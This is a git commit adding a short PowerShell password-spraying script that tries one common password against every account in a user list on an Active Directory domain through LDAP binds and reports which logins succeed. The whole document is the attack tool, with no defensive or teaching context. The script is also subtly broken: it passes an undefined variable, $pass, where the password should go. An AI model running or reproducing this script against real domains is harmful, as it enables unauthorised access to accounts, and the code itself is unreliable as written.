155e47609d544d4b4f8ba2a7b628cc3d0e1c7c1e
ville87 <38942588+ville87@users.noreply.github.com>
2021-09-08 11:43:21 +0200

    Create powershell_pwspray.ps1

---
+++ Windows/powershell_pwspray.ps1
@@ -0,0 +1,13 @@
+$userlist = Get-content "C:\users\bob\desktop\userlist.txt"
+$password = "Sommer2020"
+$Domain ="domain.local"
+$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
+$count = $UserList.count
+Write-Host "[*] Now trying password $password against $count users."
+foreach($user in $userlist){
+    $checkdomain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$pass)
+    if ($checkdomain.name -ne $null)
+    {
+        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+    }
+}
